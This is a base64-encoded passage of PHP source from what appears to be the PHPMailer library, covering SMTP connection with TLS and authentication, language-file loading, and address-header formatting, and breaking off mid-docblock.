ICAgICAgICAvL0lmIGl0J3Mgbm90IHNwZWNpZmllZCwgdGhlIGRlZmF1bHQgdmFsdWUgaXMgdXNlZAoKICAgICAgICAgICAgLy9DaGVjayB0aGUgaG9zdCBuYW1lIGlzIGEgdmFsaWQgbmFtZSBvciBJUCBhZGRyZXNzIGJlZm9yZSB0cnlpbmcgdG8gdXNlIGl0CiAgICAgICAgICAgIGlmICghc3RhdGljOjppc1ZhbGlkSG9zdCgkaG9zdGluZm9bMl0pKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCR0aGlzLT5sYW5nKCdpbnZhbGlkX2hvc3QnKSAuICcgJyAuICRob3N0aW5mb1syXSk7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkcHJlZml4ID0gJyc7CiAgICAgICAgICAgICRzZWN1cmUgPSAkdGhpcy0+U01UUFNlY3VyZTsKICAgICAgICAgICAgJHRscyA9IChzdGF0aWM6OkVOQ1JZUFRJT05fU1RBUlRUTFMgPT09ICR0aGlzLT5TTVRQU2VjdXJlKTsKICAgICAgICAgICAgaWYgKCdzc2wnID09PSAkaG9zdGluZm9bMV0gfHwgKCcnID09PSAkaG9zdGluZm9bMV0gJiYgc3RhdGljOjpFTkNSWVBUSU9OX1NNVFBTID09PSAkdGhpcy0+U01UUFNlY3VyZSkpIHsKICAgICAgICAgICAgICAgICRwcmVmaXggPSAnc3NsOi8vJzsKICAgICAgICAgICAgICAgICR0bHMgPSBmYWxzZTsgLy9DYW4ndCBoYXZlIFNTTCBhbmQgVExTIGF0IHRoZSBzYW1lIHRpbWUKICAgICAgICAgICAgICAgICRzZWN1cmUgPSBzdGF0aWM6OkVOQ1JZUFRJT05fU01UUFM7CiAgICAgICAgICAgIH0gZWxzZWlmICgndGxzJyA9PT0gJGhvc3RpbmZvWzFdKSB7CiAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsKICAgICAgICAgICAgICAgIC8vVExTIGRvZXNuJ3QgdXNlIGEgcHJlZml4CiAgICAgICAgICAgICAgICAkc2VjdXJlID0gc3RhdGljOjpFTkNSWVBUSU9OX1NUQVJUVExTOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vRG8gd2UgbmVlZCB0aGUgT3BlblNTTCBleHRlbnNpb24/CiAgICAgICAgICAgICRzc2xleHQgPSBkZWZpbmVkKCdPUEVOU1NMX0FMR09fU0hBMjU2Jyk7CiAgICAgICAgICAgIGlmIChzdGF0aWM6OkVOQ1JZUFRJT05fU1RBUlRUTFMgPT09ICRzZWN1cmUgfHwgc3RhdGljOjpFTkNSWVBUSU9OX1NNVFBTID09PSAkc2VjdXJlKSB7CiAgICAgICAgICAgICAgICAvL0NoZWNrIGZvciBhbiBPcGVuU1NMIGNvbnN0YW50IHJhdGhlciB0aGFuIHVzaW5nIGV4dGVuc2lvbl9sb2FkZWQsIHdoaWNoIGlzIHNvbWV0aW1lcyBkaXNhYmxlZAogICAgICAgICAgICAgICAgaWYgKCEkc3NsZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJywgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGhvc3QgPSAkaG9zdGluZm9bMl07CiAgICAgICAgICAgICRwb3J0ID0gJHRoaXMtPlBvcnQ7CiAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIGFycmF5X2tleV9leGlzdHMoMywgJGhvc3RpbmZvKSAmJgogICAgICAgICAgICAgICAgaXNfbnVtZXJpYygkaG9zdGluZm9bM10pICYmCiAgICAgICAgICAgICAgICAkaG9zdGluZm9bM10gPiAwICYmCiAgICAgICAgICAgICAgICAkaG9zdGluZm9bM10gPCA2NTUzNgogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICRwb3J0ID0gKGludCkgJGhvc3RpbmZvWzNdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdCgkcHJlZml4IC4gJGhvc3QsICRwb3J0LCAkdGhpcy0+VGltZW91dCwgJG9wdGlvbnMpKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+SGVsbykgewogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+SGVsbzsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+c2VydmVySG9zdG5hbWUoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7CiAgICAgICAgICAgICAgICAgICAgLy9BdXRvbWF0aWNhbGx5IGVuYWJsZSBUTFMgZW5jcnlwdGlvbiBpZjoKICAgICAgICAgICAgICAgICAgICAvLyogaXQncyBub3QgZGlzYWJsZWQKICAgICAgICAgICAgICAgICAgICAvLyogd2UgYXJlIG5vdCBjb25uZWN0aW5nIHRvIGxvY2FsaG9zdAogICAgICAgICAgICAgICAgICAgIC8vKiB3ZSBoYXZlIG9wZW5zc2wgZXh0ZW5zaW9uCiAgICAgICAgICAgICAgICAgICAgLy8qIHdlIGFyZSBub3QgYWxyZWFkeSB1c2luZyBTU0wKICAgICAgICAgICAgICAgICAgICAvLyogdGhlIHNlcnZlciBvZmZlcnMgU1RBUlRUTFMKICAgICAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TTVRQQXV0b1RMUyAmJgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+SG9zdCAhPT0gJ2xvY2FsaG9zdCcgJiYKICAgICAgICAgICAgICAgICAgICAgICAgJHNzbGV4dCAmJgogICAgICAgICAgICAgICAgICAgICAgICAkc2VjdXJlICE9PSAnc3NsJyAmJgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+Z2V0U2VydmVyRXh0KCdTVEFSVFRMUycpCiAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0bHMgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRscykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5zdGFydFRMUygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICR0aGlzLT5nZXRTbXRwRXJyb3JNZXNzYWdlKCdjb25uZWN0X2hvc3QnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJG1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC8vV2UgbXVzdCByZXNlbmQgRUhMTyBhZnRlciBUTFMgbmVnb3RpYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNNVFBBdXRoICYmICEkdGhpcy0+c210cC0+YXV0aGVudGljYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlBhc3N3b3JkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkF1dGhUeXBlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm9hdXRoCiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnYXV0aGVudGljYXRlJykpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgICAgICRsYXN0ZXhjZXB0aW9uID0gJGV4YzsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICAgICAgLy9XZSBtdXN0IGhhdmUgY29ubmVjdGVkLCBidXQgdGhlbiBmYWlsZWQgVExTIG9yIEF1dGgsIHNvIGNsb3NlIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvL0lmIHdlIGdldCBoZXJlLCBhbGwgY29ubmVjdGlvbiBhdHRlbXB0cyBoYXZlIGZhaWxlZCwgc28gY2xvc2UgY29ubmVjdGlvbiBoYXJkCiAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgLy9BcyB3ZSd2ZSBjYXVnaHQgYWxsIGV4Y2VwdGlvbnMsIGp1c3QgcmVwb3J0IHdoYXRldmVyIHRoZSBsYXN0IG9uZSB3YXMKICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMgJiYgbnVsbCAhPT0gJGxhc3RleGNlcHRpb24pIHsKICAgICAgICAgICAgdGhyb3cgJGxhc3RleGNlcHRpb247CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAvLyBubyBleGNlcHRpb24gd2FzIHRocm93biwgbGlrZWx5ICR0aGlzLT5zbXRwLT5jb25uZWN0KCkgZmFpbGVkCiAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmdldFNtdHBFcnJvck1lc3NhZ2UoJ2Nvbm5lY3RfaG9zdCcpOwogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCRtZXNzYWdlKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENsb3NlIHRoZSBhY3RpdmUgU01UUCBzZXNzaW9uIGlmIG9uZSBleGlzdHMuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzbXRwQ2xvc2UoKQogICAgewogICAgICAgIGlmICgobnVsbCAhPT0gJHRoaXMtPnNtdHApICYmICR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIGxhbmd1YWdlIGZvciBlcnJvciBtZXNzYWdlcy4KICAgICAqIFRoZSBkZWZhdWx0IGxhbmd1YWdlIGlzIEVuZ2xpc2guCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkbGFuZ2NvZGUgIElTTyA2MzktMSAyLWNoYXJhY3RlciBsYW5ndWFnZSBjb2RlIChlLmcuIEZyZW5jaCBpcyAiZnIiKQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgIE9wdGlvbmFsbHksIHRoZSBsYW5ndWFnZSBjb2RlIGNhbiBiZSBlbmhhbmNlZCB3aXRoIGEgNC1jaGFyYWN0ZXIKICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHQgYW5ub3RhdGlvbiBhbmQvb3IgYSAyLWNoYXJhY3RlciBjb3VudHJ5IGFubm90YXRpb24uCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsYW5nX3BhdGggUGF0aCB0byB0aGUgbGFuZ3VhZ2UgZmlsZSBkaXJlY3RvcnksIHdpdGggdHJhaWxpbmcgc2VwYXJhdG9yIChzbGFzaCkKICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICBEbyBub3Qgc2V0IHRoaXMgZnJvbSB1c2VyIGlucHV0IQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBSZXR1cm5zIHRydWUgaWYgdGhlIHJlcXVlc3RlZCBsYW5ndWFnZSB3YXMgbG9hZGVkLCBmYWxzZSBvdGhlcndpc2UuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRMYW5ndWFnZSgkbGFuZ2NvZGUgPSAnZW4nLCAkbGFuZ19wYXRoID0gJycpCiAgICB7CiAgICAgICAgLy9CYWNrd2FyZHMgY29tcGF0aWJpbGl0eSBmb3IgcmVuYW1lZCBsYW5ndWFnZSBjb2RlcwogICAgICAgICRyZW5hbWVkX2xhbmdjb2RlcyA9IFsKICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLAogICAgICAgICAgICAnY3onID0+ICdjcycsCiAgICAgICAgICAgICdkaycgPT4gJ2RhJywKICAgICAgICAgICAgJ25vJyA9PiAnbmInLAogICAgICAgICAgICAnc2UnID0+ICdzdicsCiAgICAgICAgICAgICdycycgPT4gJ3NyJywKICAgICAgICAgICAgJ3RnJyA9PiAndGwnLAogICAgICAgICAgICAnYW0nID0+ICdoeScsCiAgICAgICAgXTsKCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJGxhbmdjb2RlLCAkcmVuYW1lZF9sYW5nY29kZXMpKSB7CiAgICAgICAgICAgICRsYW5nY29kZSA9ICRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdOwogICAgICAgIH0KCiAgICAgICAgLy9EZWZpbmUgZnVsbCBzZXQgb2YgdHJhbnNsYXRhYmxlIHN0cmluZ3MgaW4gRW5nbGlzaAogICAgICAgICRQSFBNQUlMRVJfTEFORyA9IFsKICAgICAgICAgICAgJ2F1dGhlbnRpY2F0ZScgPT4gJ1NNVFAgRXJyb3I6IENvdWxkIG5vdCBhdXRoZW50aWNhdGUuJywKICAgICAgICAgICAgJ2J1Z2d5X3BocCcgPT4gJ1lvdXIgdmVyc2lvbiBvZiBQSFAgaXMgYWZmZWN0ZWQgYnkgYSBidWcgdGhhdCBtYXkgcmVzdWx0IGluIGNvcnJ1cHRlZCBtZXNzYWdlcy4nIC4KICAgICAgICAgICAgICAgICcgVG8gZml4IGl0LCBzd2l0Y2ggdG8gc2VuZGluZyB1c2luZyBTTVRQLCBkaXNhYmxlIHRoZSBtYWlsLmFkZF94X2hlYWRlciBvcHRpb24gaW4nIC4KICAgICAgICAgICAgICAgICcgeW91ciBwaHAuaW5pLCBzd2l0Y2ggdG8gTWFjT1Mgb3IgTGludXgsIG9yIHVwZ3JhZGUgeW91ciBQSFAgdG8gdmVyc2lvbiA3LjAuMTcrIG9yIDcuMS4zKy4nLAogICAgICAgICAgICAnY29ubmVjdF9ob3N0JyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGNvbm5lY3QgdG8gU01UUCBob3N0LicsCiAgICAgICAgICAgICdkYXRhX25vdF9hY2NlcHRlZCcgPT4gJ1NNVFAgRXJyb3I6IGRhdGEgbm90IGFjY2VwdGVkLicsCiAgICAgICAgICAgICdlbXB0eV9tZXNzYWdlJyA9PiAnTWVzc2FnZSBib2R5IGVtcHR5JywKICAgICAgICAgICAgJ2VuY29kaW5nJyA9PiAnVW5rbm93biBlbmNvZGluZzogJywKICAgICAgICAgICAgJ2V4ZWN1dGUnID0+ICdDb3VsZCBub3QgZXhlY3V0ZTogJywKICAgICAgICAgICAgJ2V4dGVuc2lvbl9taXNzaW5nJyA9PiAnRXh0ZW5zaW9uIG1pc3Npbmc6ICcsCiAgICAgICAgICAgICdmaWxlX2FjY2VzcycgPT4gJ0NvdWxkIG5vdCBhY2Nlc3MgZmlsZTogJywKICAgICAgICAgICAgJ2ZpbGVfb3BlbicgPT4gJ0ZpbGUgRXJyb3I6IENvdWxkIG5vdCBvcGVuIGZpbGU6ICcsCiAgICAgICAgICAgICdmcm9tX2ZhaWxlZCcgPT4gJ1RoZSBmb2xsb3dpbmcgRnJvbSBhZGRyZXNzIGZhaWxlZDogJywKICAgICAgICAgICAgJ2luc3RhbnRpYXRlJyA9PiAnQ291bGQgbm90IGluc3RhbnRpYXRlIG1haWwgZnVuY3Rpb24uJywKICAgICAgICAgICAgJ2ludmFsaWRfYWRkcmVzcycgPT4gJ0ludmFsaWQgYWRkcmVzczogJywKICAgICAgICAgICAgJ2ludmFsaWRfaGVhZGVyJyA9PiAnSW52YWxpZCBoZWFkZXIgbmFtZSBvciB2YWx1ZScsCiAgICAgICAgICAgICdpbnZhbGlkX2hvc3RlbnRyeScgPT4gJ0ludmFsaWQgaG9zdGVudHJ5OiAnLAogICAgICAgICAgICAnaW52YWxpZF9ob3N0JyA9PiAnSW52YWxpZCBob3N0OiAnLAogICAgICAgICAgICAnbWFpbGVyX25vdF9zdXBwb3J0ZWQnID0+ICcgbWFpbGVyIGlzIG5vdCBzdXBwb3J0ZWQuJywKICAgICAgICAgICAgJ3Byb3ZpZGVfYWRkcmVzcycgPT4gJ1lvdSBtdXN0IHByb3ZpZGUgYXQgbGVhc3Qgb25lIHJlY2lwaWVudCBlbWFpbCBhZGRyZXNzLicsCiAgICAgICAgICAgICdyZWNpcGllbnRzX2ZhaWxlZCcgPT4gJ1NNVFAgRXJyb3I6IFRoZSBmb2xsb3dpbmcgcmVjaXBpZW50cyBmYWlsZWQ6ICcsCiAgICAgICAgICAgICdzaWduaW5nJyA9PiAnU2lnbmluZyBFcnJvcjogJywKICAgICAgICAgICAgJ3NtdHBfY29kZScgPT4gJ1NNVFAgY29kZTogJywKICAgICAgICAgICAgJ3NtdHBfY29kZV9leCcgPT4gJ0FkZGl0aW9uYWwgU01UUCBpbmZvOiAnLAogICAgICAgICAgICAnc210cF9jb25uZWN0X2ZhaWxlZCcgPT4gJ1NNVFAgY29ubmVjdCgpIGZhaWxlZC4nLAogICAgICAgICAgICAnc210cF9kZXRhaWwnID0+ICdEZXRhaWw6ICcsCiAgICAgICAgICAgICdzbXRwX2Vycm9yJyA9PiAnU01UUCBzZXJ2ZXIgZXJyb3I6ICcsCiAgICAgICAgICAgICd2YXJpYWJsZV9zZXQnID0+ICdDYW5ub3Qgc2V0IG9yIHJlc2V0IHZhcmlhYmxlOiAnLAogICAgICAgICAgICAnbm9fc210cHV0ZjgnID0+ICdTZXJ2ZXIgZG9lcyBub3Qgc3VwcG9ydCBTTVRQVVRGOCBuZWVkZWQgdG8gc2VuZCB0byBVbmljb2RlIGFkZHJlc3NlcycsCiAgICAgICAgXTsKICAgICAgICBpZiAoZW1wdHkoJGxhbmdfcGF0aCkpIHsKICAgICAgICAgICAgLy9DYWxjdWxhdGUgYW4gYWJzb2x1dGUgcGF0aCBzbyBpdCBjYW4gd29yayBpZiBDV0QgaXMgbm90IGhlcmUKICAgICAgICAgICAgJGxhbmdfcGF0aCA9IGRpcm5hbWUoX19ESVJfXykgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2xhbmd1YWdlJyAuIERJUkVDVE9SWV9TRVBBUkFUT1I7CiAgICAgICAgfQoKICAgICAgICAvL1ZhbGlkYXRlICRsYW5nY29kZQogICAgICAgICRmb3VuZGxhbmcgPSB0cnVlOwogICAgICAgICRsYW5nY29kZSAgPSBzdHJ0b2xvd2VyKCRsYW5nY29kZSk7CiAgICAgICAgaWYgKAogICAgICAgICAgICAhcHJlZ19tYXRjaCgnL14oP1A8bGFuZz5bYS16XXsyfSkoP1A8c2NyaXB0Pl9bYS16XXs0fSk/KD9QPGNvdW50cnk+X1thLXpdezJ9KT8kLycsICRsYW5nY29kZSwgJG1hdGNoZXMpCiAgICAgICAgICAgICYmICRsYW5nY29kZSAhPT0gJ2VuJwogICAgICAgICkgewogICAgICAgICAgICAkZm91bmRsYW5nID0gZmFsc2U7CiAgICAgICAgICAgICRsYW5nY29kZSA9ICdlbic7CiAgICAgICAgfQoKICAgICAgICAvL1RoZXJlIGlzIG5vIEVuZ2xpc2ggdHJhbnNsYXRpb24gZmlsZQogICAgICAgIGlmICgnZW4nICE9PSAkbGFuZ2NvZGUpIHsKICAgICAgICAgICAgJGxhbmdjb2RlcyA9IFtdOwogICAgICAgICAgICBpZiAoIWVtcHR5KCRtYXRjaGVzWydzY3JpcHQnXSkgJiYgIWVtcHR5KCRtYXRjaGVzWydjb3VudHJ5J10pKSB7CiAgICAgICAgICAgICAgICAkbGFuZ2NvZGVzW10gPSAkbWF0Y2hlc1snbGFuZyddIC4gJG1hdGNoZXNbJ3NjcmlwdCddIC4gJG1hdGNoZXNbJ2NvdW50cnknXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoIWVtcHR5KCRtYXRjaGVzWydjb3VudHJ5J10pKSB7CiAgICAgICAgICAgICAgICAkbGFuZ2NvZGVzW10gPSAkbWF0Y2hlc1snbGFuZyddIC4gJG1hdGNoZXNbJ2NvdW50cnknXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoIWVtcHR5KCRtYXRjaGVzWydzY3JpcHQnXSkpIHsKICAgICAgICAgICAgICAgICRsYW5nY29kZXNbXSA9ICRtYXRjaGVzWydsYW5nJ10gLiAkbWF0Y2hlc1snc2NyaXB0J107CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGxhbmdjb2Rlc1tdID0gJG1hdGNoZXNbJ2xhbmcnXTsKCiAgICAgICAgICAgIC8vVHJ5IGFuZCBmaW5kIGEgcmVhZGFibGUgbGFuZ3VhZ2UgZmlsZSBmb3IgdGhlIHJlcXVlc3RlZCBsYW5ndWFnZS4KICAgICAgICAgICAgJGZvdW5kRmlsZSA9IGZhbHNlOwogICAgICAgICAgICBmb3JlYWNoICgkbGFuZ2NvZGVzIGFzICRjb2RlKSB7CiAgICAgICAgICAgICAgICAkbGFuZ19maWxlID0gJGxhbmdfcGF0aCAuICdwaHBtYWlsZXIubGFuZy0nIC4gJGNvZGUgLiAnLnBocCc7CiAgICAgICAgICAgICAgICBpZiAoc3RhdGljOjpmaWxlSXNBY2Nlc3NpYmxlKCRsYW5nX2ZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJGZvdW5kRmlsZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkZm91bmRGaWxlID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgJGZvdW5kbGFuZyA9IGZhbHNlOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJGxpbmVzID0gZmlsZSgkbGFuZ19maWxlKTsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAgICAgICAgICAgICAgIC8vVHJhbnNsYXRpb24gZmlsZSBsaW5lcyBsb29rIGxpa2UgdGhpczoKICAgICAgICAgICAgICAgICAgICAvLyRQSFBNQUlMRVJfTEFOR1snYXV0aGVudGljYXRlJ10gPSAnU01UUC1GZWhsZXI6IEF1dGhlbnRpZml6aWVydW5nIGZlaGxnZXNjaGxhZ2VuLic7CiAgICAgICAgICAgICAgICAgICAgLy9UaGVzZSBmaWxlcyBhcmUgcGFyc2VkIGFzIHRleHQgYW5kIG5vdCBQSFAgc28gYXMgdG8gYXZvaWQgdGhlIHBvc3NpYmlsaXR5IG9mIGNvZGUgaW5qZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgLy9TZWUgaHR0cHM6Ly9ibG9nLnN0ZXZlbmxldml0aGFuLmNvbS9hcmNoaXZlcy9tYXRjaC1xdW90ZWQtc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgJG1hdGNoZXMgPSBbXTsKICAgICAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnL15cJFBIUE1BSUxFUl9MQU5HXFtcJyhbYS16XGRfXSspXCdcXVxzKj1ccyooWyJcJ10pKC4rKSo/XDI7LycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtYXRjaGVzCiAgICAgICAgICAgICAgICAgICAgICAgICkgJiYKICAgICAgICAgICAgICAgICAgICAgICAgLy9JZ25vcmUgdW5rbm93biB0cmFuc2xhdGlvbiBrZXlzCiAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5X2tleV9leGlzdHMoJG1hdGNoZXNbMV0sICRQSFBNQUlMRVJfTEFORykKICAgICAgICAgICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9PdmVyd3JpdGUgbGFuZ3VhZ2Utc3BlY2lmaWMgc3RyaW5ncyBzbyB3ZSdsbCBuZXZlciBoYXZlIG1pc3NpbmcgdHJhbnNsYXRpb24ga2V5cy4KICAgICAgICAgICAgICAgICAgICAgICAgJFBIUE1BSUxFUl9MQU5HWyRtYXRjaGVzWzFdXSA9IChzdHJpbmcpJG1hdGNoZXNbM107CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsKCiAgICAgICAgcmV0dXJuICRmb3VuZGxhbmc7IC8vUmV0dXJucyBmYWxzZSBpZiBsYW5ndWFnZSBub3QgZm91bmQKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VHJhbnNsYXRpb25zKCkKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPmxhbmd1YWdlKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0TGFuZ3VhZ2UoKTsgLy8gU2V0IHRoZSBkZWZhdWx0IGxhbmd1YWdlLgogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSByZWNpcGllbnQgaGVhZGVycy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlCiAgICAgKiBAcGFyYW0gYXJyYXkgICRhZGRyIEFuIGFycmF5IG9mIHJlY2lwaWVudHMsCiAgICAgKiAgICAgICAgICAgICAgICAgICAgIHdoZXJlIGVhY2ggcmVjaXBpZW50IGlzIGEgMi1lbGVtZW50IGluZGV4ZWQgYXJyYXkgd2l0aCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzCiAgICAgKiAgICAgICAgICAgICAgICAgICAgIGFuZCBlbGVtZW50IDEgY29udGFpbmluZyBhIG5hbWUsIGxpa2U6CiAgICAgKiAgICAgICAgICAgICAgICAgICAgIFtbJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlciddLCBbJ3pvZUBleGFtcGxlLmNvbScsICdab2UgVXNlciddXQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRyQXBwZW5kKCR0eXBlLCAkYWRkcikKICAgIHsKICAgICAgICAkYWRkcmVzc2VzID0gW107CiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gJHRoaXMtPmFkZHJGb3JtYXQoJGFkZHJlc3MpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0eXBlIC4gJzogJyAuIGltcGxvZGUoJywgJywgJGFkZHJlc3NlcykgLiBzdGF0aWM6OiRMRTsKICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhbiBhZGRyZXNzIGZvciB1c2UgaW4gYSBtZXNzYWdlIGhlYWRlci4KICAgICAqCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSwgZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcywgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lIGxpa2UKICAgICAqICAgICAgICAgICAgICAgICAgICBbJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlciddCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZHJGb3JtYXQoJGFkZHIpCiAgICB7CiAgICAgICAgaWYgKCFpc3NldCgkYWRkclsxXSkgfHwgKCRhZGRyWzFdID09PSAnJykpIHsgLy9ObyBuYW1lIHByb3ZpZGVkCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzBdKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLgogICAgICAgICAgICAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclswXSkgLiAnPic7CiAgICB9CgogICAgLyoqCiAgICAgKiBXb3JkLXdyYXAgbWVzc2FnZS4KICAgICAqIE